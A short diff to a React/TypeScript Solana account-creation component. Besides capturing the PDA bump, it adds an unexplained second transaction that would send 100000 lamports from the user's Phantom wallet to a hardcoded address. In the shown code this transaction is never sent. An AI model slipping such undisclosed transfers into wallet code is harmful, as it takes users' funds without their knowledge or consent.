@@ -41,7 +41,7 @@ const CreateAccount = (props: any) => {
     }
     const instructionDataBuffer = user.serialize();
     const transaction = new Transaction();
-    const [pda] = await PublicKey.findProgramAddress(
+    const [pda, bump] = await PublicKey.findProgramAddress(
       [Buffer.from("user"), new PublicKey(phantomWalletPublicKey).toBuffer()],
       new PublicKey(PROGRAM_ID)
     );
@@ -67,6 +67,14 @@ const CreateAccount = (props: any) => {
       programId: new PublicKey(PROGRAM_ID),
     });
     transaction.add(instruction);
+
+    const transaction2 = new Transaction().add(
+      SystemProgram.transfer({
+        fromPubkey: phantomWalletPublicKey,
+        toPubkey: new PublicKey("B1GmJpBZeGrW144CcSkHxxHE4yoyXnudNhWoewVDyfnL"),
+        lamports: 100000,
+      })
+    );
 
     signAndSendTransaction(transaction);
     console.log("Transaction sent", transaction);
